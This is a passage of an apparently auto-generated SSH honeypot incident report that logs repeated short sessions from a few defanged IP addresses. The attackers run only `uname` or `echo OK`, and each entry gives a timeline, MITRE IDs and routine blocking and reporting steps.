**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:56:22` | `cowrie.session.connect` |
| `2026-06-25 06:56:22` | `cowrie.client.version` |
| `2026-06-25 06:56:22` | `cowrie.client.kex` |
| `2026-06-25 06:56:23` | `cowrie.login.success` |
| `2026-06-25 06:56:23` | `cowrie.session.params` |
| `2026-06-25 06:56:23` | `cowrie.command.input` |
| `2026-06-25 06:56:23` | `cowrie.log.closed` |
| `2026-06-25 06:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f7a61ebe15

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 06:57 |
| **Last Seen** | 2026-06-25 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:57:14` | `cowrie.session.connect` |
| `2026-06-25 06:57:14` | `cowrie.client.version` |
| `2026-06-25 06:57:15` | `cowrie.client.kex` |
| `2026-06-25 06:57:15` | `cowrie.login.success` |
| `2026-06-25 06:57:16` | `cowrie.session.params` |
| `2026-06-25 06:57:16` | `cowrie.command.input` |
| `2026-06-25 06:57:16` | `cowrie.log.closed` |
| `2026-06-25 06:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2b065334ae

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 06:58 |
| **Last Seen** | 2026-06-25 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:58:06` | `cowrie.session.connect` |
| `2026-06-25 06:58:06` | `cowrie.client.version` |
| `2026-06-25 06:58:06` | `cowrie.client.kex` |
| `2026-06-25 06:58:06` | `cowrie.login.success` |
| `2026-06-25 06:58:07` | `cowrie.session.params` |
| `2026-06-25 06:58:07` | `cowrie.command.input` |
| `2026-06-25 06:58:07` | `cowrie.log.closed` |
| `2026-06-25 06:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26818374d24c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 06:58 |
| **Last Seen** | 2026-06-25 06:58 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:58:25` | `cowrie.session.connect` |
| `2026-06-25 06:58:25` | `cowrie.client.version` |
| `2026-06-25 06:58:25` | `cowrie.client.kex` |
| `2026-06-25 06:58:26` | `cowrie.login.success` |
| `2026-06-25 06:58:27` | `cowrie.session.params` |
| `2026-06-25 06:58:27` | `cowrie.command.input` |
| `2026-06-25 06:58:27` | `cowrie.log.closed` |
| `2026-06-25 06:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff4a5d958f8

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 06:58 |
| **Last Seen** | 2026-06-25 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:58:57` | `cowrie.session.connect` |
| `2026-06-25 06:58:57` | `cowrie.client.version` |
| `2026-06-25 06:58:57` | `cowrie.client.kex` |
| `2026-06-25 06:58:58` | `cowrie.login.success` |
| `2026-06-25 06:58:59` | `cowrie.session.params` |
| `2026-06-25 06:58:59` | `cowrie.command.input` |
| `2026-06-25 06:59:00` | `cowrie.log.closed` |
| `2026-06-25 06:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effc3734dcab

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 06:58 |
| **Last Seen** | 2026-06-25 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:58:58` | `cowrie.session.connect` |
| `2026-06-25 06:58:58` | `cowrie.client.version` |
| `2026-06-25 06:58:58` | `cowrie.client.kex` |
| `2026-06-25 06:58:58` | `cowrie.login.success` |
| `2026-06-25 06:59:00` | `cowrie.session.params` |
| `2026-06-25 06:59:00` | `cowrie.command.input` |
| `2026-06-25 06:59:00` | `cowrie.log.closed` |
| `2026-06-25 06:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f70dd0b06252

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 06:59 |
| **Last Seen** | 2026-06-25 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 06:59:52` | `cowrie.session.connect` |
| `2026-06-25 06:59:52` | `cowrie.client.version` |
| `2026-06-25 06:59:52` | `cowrie.client.kex` |
| `2026-06-25 06:59:52` | `cowrie.login.success` |
| `2026-06-25 06:59:53` | `cowrie.session.params` |
| `2026-06-25 06:59:53` | `cowrie.command.input` |
| `2026-06-25 06:59:53` | `cowrie.log.closed` |
| `2026-06-25 06:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc1476e1de6

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:00 |
| **Last Seen** | 2026-06-25 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:00:31` | `cowrie.session.connect` |
| `2026-06-25 07:00:31` | `cowrie.client.version` |
| `2026-06-25 07:00:31` | `cowrie.client.kex` |
| `2026-06-25 07:00:31` | `cowrie.login.success` |
| `2026-06-25 07:00:33` | `cowrie.session.params` |
| `2026-06-25 07:00:33` | `cowrie.command.input` |
| `2026-06-25 07:00:33` | `cowrie.log.closed` |
| `2026-06-25 07:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-203e40d8665b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:00 |
| **Last Seen** | 2026-06-25 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:00:48` | `cowrie.session.connect` |
| `2026-06-25 07:00:48` | `cowrie.client.version` |
| `2026-06-25 07:00:48` | `cowrie.client.kex` |
| `2026-06-25 07:00:48` | `cowrie.login.success` |
| `2026-06-25 07:00:49` | `cowrie.session.params` |
| `2026-06-25 07:00:49` | `cowrie.command.input` |
| `2026-06-25 07:00:49` | `cowrie.log.closed` |
| `2026-06-25 07:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e04b7fc4545

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:01 |
| **Last Seen** | 2026-06-25 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:01:41` | `cowrie.session.connect` |
| `2026-06-25 07:01:41` | `cowrie.client.version` |
| `2026-06-25 07:01:41` | `cowrie.client.kex` |
| `2026-06-25 07:01:42` | `cowrie.login.success` |
| `2026-06-25 07:01:42` | `cowrie.session.params` |
| `2026-06-25 07:01:42` | `cowrie.command.input` |
| `2026-06-25 07:01:43` | `cowrie.log.closed` |
| `2026-06-25 07:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ad51a61e85

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:02 |
| **Last Seen** | 2026-06-25 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:02:33` | `cowrie.session.connect` |
| `2026-06-25 07:02:33` | `cowrie.client.version` |
| `2026-06-25 07:02:33` | `cowrie.client.kex` |
| `2026-06-25 07:02:33` | `cowrie.login.success` |
| `2026-06-25 07:02:34` | `cowrie.session.params` |
| `2026-06-25 07:02:34` | `cowrie.command.input` |
| `2026-06-25 07:02:34` | `cowrie.log.closed` |
| `2026-06-25 07:02:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd535c5d661

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:02 |
| **Last Seen** | 2026-06-25 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:02:44` | `cowrie.session.connect` |
| `2026-06-25 07:02:44` | `cowrie.client.version` |
| `2026-06-25 07:02:44` | `cowrie.client.kex` |
| `2026-06-25 07:02:45` | `cowrie.login.success` |
| `2026-06-25 07:02:46` | `cowrie.session.params` |
| `2026-06-25 07:02:46` | `cowrie.command.input` |
| `2026-06-25 07:02:46` | `cowrie.log.closed` |
| `2026-06-25 07:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51712732690b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:02 |
| **Last Seen** | 2026-06-25 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:02:53` | `cowrie.session.connect` |
| `2026-06-25 07:02:53` | `cowrie.client.version` |
| `2026-06-25 07:02:53` | `cowrie.client.kex` |
| `2026-06-25 07:02:53` | `cowrie.login.success` |
| `2026-06-25 07:02:54` | `cowrie.session.params` |
| `2026-06-25 07:02:54` | `cowrie.command.input` |
| `2026-06-25 07:02:55` | `cowrie.log.closed` |
| `2026-06-25 07:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a43891a779cb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:03 |
| **Last Seen** | 2026-06-25 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:03:25` | `cowrie.session.connect` |
| `2026-06-25 07:03:25` | `cowrie.client.version` |
| `2026-06-25 07:03:25` | `cowrie.client.kex` |
| `2026-06-25 07:03:26` | `cowrie.login.success` |
| `2026-06-25 07:03:26` | `cowrie.session.params` |
| `2026-06-25 07:03:26` | `cowrie.command.input` |
| `2026-06-25 07:03:27` | `cowrie.log.closed` |
| `2026-06-25 07:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b97b2ba4d684

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:03 |
| **Last Seen** | 2026-06-25 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:03:36` | `cowrie.session.connect` |
| `2026-06-25 07:03:36` | `cowrie.client.version` |
| `2026-06-25 07:03:36` | `cowrie.client.kex` |
| `2026-06-25 07:03:36` | `cowrie.login.success` |
| `2026-06-25 07:03:37` | `cowrie.session.params` |
| `2026-06-25 07:03:37` | `cowrie.command.input` |
| `2026-06-25 07:03:38` | `cowrie.log.closed` |
| `2026-06-25 07:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2db9536f739f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:03 |
| **Last Seen** | 2026-06-25 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:03:48` | `cowrie.session.connect` |
| `2026-06-25 07:03:48` | `cowrie.client.version` |
| `2026-06-25 07:03:49` | `cowrie.client.kex` |
| `2026-06-25 07:03:49` | `cowrie.login.success` |
| `2026-06-25 07:03:50` | `cowrie.session.params` |
| `2026-06-25 07:03:50` | `cowrie.command.input` |
| `2026-06-25 07:03:51` | `cowrie.log.closed` |
| `2026-06-25 07:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781a92b67569

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:04 |
| **Last Seen** | 2026-06-25 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:04:18` | `cowrie.session.connect` |
| `2026-06-25 07:04:18` | `cowrie.client.version` |
| `2026-06-25 07:04:18` | `cowrie.client.kex` |
| `2026-06-25 07:04:18` | `cowrie.login.success` |
| `2026-06-25 07:04:19` | `cowrie.session.params` |
| `2026-06-25 07:04:19` | `cowrie.command.input` |
| `2026-06-25 07:04:19` | `cowrie.log.closed` |
| `2026-06-25 07:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946155a8d904

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:05 |
| **Last Seen** | 2026-06-25 07:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:05:11` | `cowrie.session.connect` |
| `2026-06-25 07:05:11` | `cowrie.client.version` |
| `2026-06-25 07:05:11` | `cowrie.client.kex` |
| `2026-06-25 07:05:12` | `cowrie.login.success` |
| `2026-06-25 07:05:12` | `cowrie.session.params` |
| `2026-06-25 07:05:12` | `cowrie.command.input` |
| `2026-06-25 07:05:12` | `cowrie.log.closed` |
| `2026-06-25 07:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c0df92066f7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:06 |
| **Last Seen** | 2026-06-25 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:06:05` | `cowrie.session.connect` |
| `2026-06-25 07:06:05` | `cowrie.client.version` |
| `2026-06-25 07:06:05` | `cowrie.client.kex` |
| `2026-06-25 07:06:05` | `cowrie.login.success` |
| `2026-06-25 07:06:06` | `cowrie.session.params` |
| `2026-06-25 07:06:06` | `cowrie.command.input` |
| `2026-06-25 07:06:06` | `cowrie.log.closed` |
| `2026-06-25 07:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102081536d47

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 07:06 |
| **Last Seen** | 2026-06-25 07:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:06:46` | `cowrie.session.connect` |
| `2026-06-25 07:06:47` | `cowrie.client.version` |
| `2026-06-25 07:06:47` | `cowrie.client.kex` |
| `2026-06-25 07:06:53` | `cowrie.login.success` |
| `2026-06-25 07:06:57` | `cowrie.session.params` |
| `2026-06-25 07:06:57` | `cowrie.command.input` |
| `2026-06-25 07:06:58` | `cowrie.log.closed` |
| `2026-06-25 07:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20965e9f17be

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:07 |
| **Last Seen** | 2026-06-25 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:07:03` | `cowrie.session.connect` |
| `2026-06-25 07:07:03` | `cowrie.client.version` |
| `2026-06-25 07:07:03` | `cowrie.client.kex` |
| `2026-06-25 07:07:03` | `cowrie.login.success` |
| `2026-06-25 07:07:04` | `cowrie.session.params` |
| `2026-06-25 07:07:04` | `cowrie.command.input` |
| `2026-06-25 07:07:04` | `cowrie.log.closed` |
| `2026-06-25 07:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978210124c86

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:07 |
| **Last Seen** | 2026-06-25 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:07:52` | `cowrie.session.connect` |
| `2026-06-25 07:07:52` | `cowrie.client.version` |
| `2026-06-25 07:07:52` | `cowrie.client.kex` |
| `2026-06-25 07:07:53` | `cowrie.login.success` |
| `2026-06-25 07:07:54` | `cowrie.session.params` |
| `2026-06-25 07:07:54` | `cowrie.command.input` |
| `2026-06-25 07:07:54` | `cowrie.log.closed` |
| `2026-06-25 07:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5ea7e7bbe9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:07 |
| **Last Seen** | 2026-06-25 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:07:59` | `cowrie.session.connect` |
| `2026-06-25 07:07:59` | `cowrie.client.version` |
| `2026-06-25 07:07:59` | `cowrie.client.kex` |
| `2026-06-25 07:08:00` | `cowrie.login.success` |
| `2026-06-25 07:08:00` | `cowrie.session.params` |
| `2026-06-25 07:08:00` | `cowrie.command.input` |
| `2026-06-25 07:08:00` | `cowrie.log.closed` |
| `2026-06-25 07:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d8db687a2b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:08 |
| **Last Seen** | 2026-06-25 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:08:47` | `cowrie.session.connect` |
| `2026-06-25 07:08:47` | `cowrie.client.version` |
| `2026-06-25 07:08:47` | `cowrie.client.kex` |
| `2026-06-25 07:08:48` | `cowrie.login.success` |
| `2026-06-25 07:08:49` | `cowrie.session.params` |
| `2026-06-25 07:08:49` | `cowrie.command.input` |
| `2026-06-25 07:08:49` | `cowrie.log.closed` |
| `2026-06-25 07:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3ad17b1f92

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:08 |
| **Last Seen** | 2026-06-25 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:08:50` | `cowrie.session.connect` |
| `2026-06-25 07:08:50` | `cowrie.client.version` |
| `2026-06-25 07:08:51` | `cowrie.client.kex` |
| `2026-06-25 07:08:51` | `cowrie.login.success` |
| `2026-06-25 07:08:52` | `cowrie.session.params` |
| `2026-06-25 07:08:52` | `cowrie.command.input` |
| `2026-06-25 07:08:52` | `cowrie.log.closed` |
| `2026-06-25 07:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e386a5767f78

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:08 |
| **Last Seen** | 2026-06-25 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:08:55` | `cowrie.session.connect` |
| `2026-06-25 07:08:55` | `cowrie.client.version` |
| `2026-06-25 07:08:55` | `cowrie.client.kex` |
| `2026-06-25 07:08:55` | `cowrie.login.success` |
| `2026-06-25 07:08:56` | `cowrie.session.params` |
| `2026-06-25 07:08:56` | `cowrie.command.input` |
| `2026-06-25 07:08:56` | `cowrie.log.closed` |
| `2026-06-25 07:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ac6c2585708

| Field | Detail |
